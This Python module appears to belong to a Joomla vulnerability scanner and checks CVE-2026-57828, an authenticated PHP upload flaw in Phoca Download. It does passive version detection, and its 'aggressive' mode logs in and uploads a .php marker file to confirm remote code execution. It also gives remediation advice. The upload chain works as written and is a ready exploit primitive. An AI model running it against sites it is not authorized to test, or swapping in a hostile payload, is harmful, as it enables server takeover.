from __future__ import annotations

import re
import secrets
from typing import Any
from urllib.parse import quote

from ...core.http import (
    HttpClient,
    build_multipart,
    form_encode,
    is_transport_error,
    normalize_url,
    transport_error_detail,
)
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-57828"
NAME = "Phoca Download registered-user unrestricted file upload"
COMPONENT = "Phoca Download"
AFFECTED_RULE = "Phoca Download 1.0 through 6.1.2; fixed in 6.1.3"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
LOGIN_PAGE = "/index.php?option=com_users&view=login"
LOGIN_POST = "/index.php/component/users?task=user.login"
USER_PAGE = "/index.php?option=com_phocadownload&view=user"
UPLOAD_PATH = "/index.php?option=com_phocadownload&view=user&task=upload"
TOKEN_RE = re.compile(r'name="([a-f0-9]{32})" value="1"')
BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("6.1.3")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("phocadownload", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="Phoca Download was not detected through its manifest or component route.", action="No action is required unless Phoca Download is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected Phoca Download {version}, within the affected range below 6.1.3. The user control panel calls canUpload() with frontEnd=2, which skips the frontend extension allow-list."
        action = "Upgrade Phoca Download to 6.1.3 or newer and remove unexpected files from the userupload folders."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected Phoca Download {version}, which applies the frontend allow-list to every non-admin upload."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "Phoca Download was detected, but its version could not be determined."
        action = "Determine the installed Phoca Download version and upgrade to 6.1.3 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _token(body: str) -> str | None:
    match = TOKEN_RE.search(body)
    return match.group(1) if match else None


def _frontend_login(client: HttpClient, base: str, username: str, password: str, timeout: int) -> bool:
    page = client.get(f"{base}{LOGIN_PAGE}", timeout=timeout)
    if is_transport_error(page):
        return False
    token = _token(page.get("body") or "")
    if not token:
        return False
    response = client.request(
        f"{base}{LOGIN_POST}",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": BROWSER_UA},
        data=form_encode({"username": username, "password": password, token: "1", "return": "aW5kZXgucGhw"}),
        timeout=timeout,
    )
    if is_transport_error(response):
        return False
    body = (response.get("body") or "").lower()
    return "logout" in body or ("com_users" in body and "login" not in body[:200])


def run_aggressive_probe(
    target_url: str,
    username: str | None = None,
    password: str | None = None,
    catid: int = 1,
    timeout: int = 15,
    proxy: str | None = None,
) -> Finding:
    """Upload a PHP marker through the registered-user control panel.

    Phoca Download 6.1.2's ``singleFileUpload()`` passes ``frontEnd=2`` to
    ``canUpload()``. The function only takes the frontend allow-list branch
    when ``frontEnd == 1``; for 2 it takes the download branch, whose default
    ``ignore_file_types_check=2`` skips the extension check. A registered user
    can therefore write ``.php`` under ``/phocadownload/userupload/<user>/``.
    6.1.3 changes the check to ``(int) $frontEnd > 0``.
    """
    base = normalize_url(target_url)
    if not username or not password:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=f"{base}{LOGIN_PAGE}", detail="The upload proof needs a registered account with upload rights. Pass --aggressive-arg username=... password=... catid=... on an authorized staging site. Nothing was sent.", action="Re-run with the lab uploader credentials and category id.")

    client = HttpClient(timeout=timeout, proxy=proxy)
    if not _frontend_login(client, base, username, password, timeout):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{LOGIN_PAGE}", detail="The frontend login did not establish a registered session; the upload probe was not attempted.", action="Verify the lab credentials and frontend login route.")

    page = client.get(f"{base}{USER_PAGE}", timeout=timeout)
    if is_transport_error(page):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{USER_PAGE}", detail=f"The user control panel failed in transit ({transport_error_detail(page)}).", action="Retry when the target is reachable.")
    token = _token(page.get("body") or "")
    if not token:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{USER_PAGE}", detail="The registered session did not expose a CSRF token or the user control panel is disabled.", action="Enable the Phoca Download user control panel and upload rights on an authorized staging site.")

    marker = f"PROOFCMS_57828_{secrets.token_hex(6).upper()}"
    filename = f"proofcms-57828-{secrets.token_hex(4)}.php"
    payload = f'<?php echo "PROOFCMS_57828_" . "{marker.rsplit("_", 1)[-1]}"; ?>'.encode()
    content_type, body = build_multipart(
        {
            token: "1",
            "catidfiles": str(catid),
            "phocadownloaduploadtitle": "ProofCMS 57828",
            "phocadownloaduploaddescription": "proofcms upload probe",
            "phocadownloaduploadauthor": "ProofCMS",
        },
        {"Filedata": (filename, payload, "application/x-php")},
    )
    response = client.request(
        f"{base}{UPLOAD_PATH}&{token}=1",
        method="POST",
        headers={"Content-Type": content_type, "User-Agent": BROWSER_UA},
        data=body,
        timeout=timeout,
    )
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{UPLOAD_PATH}", detail=f"The upload request failed in transit ({transport_error_detail(response)}).", action="Retry when the target is reachable.")

    file_url = f"{base}/phocadownload/userupload/{quote(username, safe='')}/{filename}"
    served = client.get(file_url, timeout=timeout)
    served_status = 0 if is_transport_error(served) else served.get("status", 0)
    served_body = "" if is_transport_error(served) else (served.get("body") or "")
    executed = marker in served_body
    stored = served_status == 200 and "<?php" in served_body
    response_text = (response.get("body") or "").lower()
    rejected = "not allowed" in response_text or "cannot be uploaded" in response_text
    evidence = {
        "username": username,
        "catid": catid,
        "filename": filename,
        "upload_status": response.get("status"),
        "upload_rejected": rejected,
        "file_url": file_url,
        "file_status": served_status,
        "marker_executed": executed,
        "source_served": stored,
    }
    if executed:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=file_url,
            evidence=evidence,
            detail=(
                "A registered user uploaded a PHP file through the Phoca Download control panel and the server "
                "executed it from /phocadownload/userupload/. The marker is computed by PHP, so a static read would "
                "not produce it."
            ),
            action="Upgrade Phoca Download to 6.1.3 or newer and remove the uploaded file from the userupload folder.",
        )
    if stored:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE_UPLOAD_ONLY",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=file_url,
            evidence=evidence,
            detail="The PHP file was written and served, but the server returned its source instead of executing it. The upload primitive is confirmed; RCE depends on the web server configuration.",
            action="Upgrade Phoca Download to 6.1.3 or newer and remove the uploaded file.",
        )
    status = "BLOCKED_EXTERNAL" if response.get("status") in (401, 403) else "NOT_CONFIRMED"
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{UPLOAD_PATH}",
        evidence=evidence,
        detail=(
            "The upload was rejected or the file was not served. 6.1.3 applies the frontend allow-list and rejects "
            ".php uploads."
        ),
        action="Upgrade affected Phoca Download versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}/index.php?option=com_phocadownload"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The Phoca Download page could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The Phoca Download page is reachable; the authenticated upload payload was not sent in safe mode.", action="Use aggressive mode with a registered uploader account on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 15, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because Phoca Download was not detected as potentially affected."
            return passive
        username = aggressive_value(aggressive_args, aggressive_command, "username")
        password = aggressive_value(aggressive_args, aggressive_command, "password")
        catid_value = aggressive_value(aggressive_args, aggressive_command, "catid")
        result = run_aggressive_probe(
            target_url,
            username=username,
            password=password,
            catid=int(catid_value) if catid_value and catid_value.isdigit() else 1,
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (Phoca Download reachability) and aggressive (registered-user PHP upload) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Remote Code Execution", "module_version": "1.0.0", "last_reviewed": "2026-11-18", "updated": "2026-11-18", "required_detectors": ["phocadownload"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-57828", "https://www.phoca.cz/phocadownload", "https://mysites.guru/blog/phoca-download-authenticated-file-upload-rce/"]}
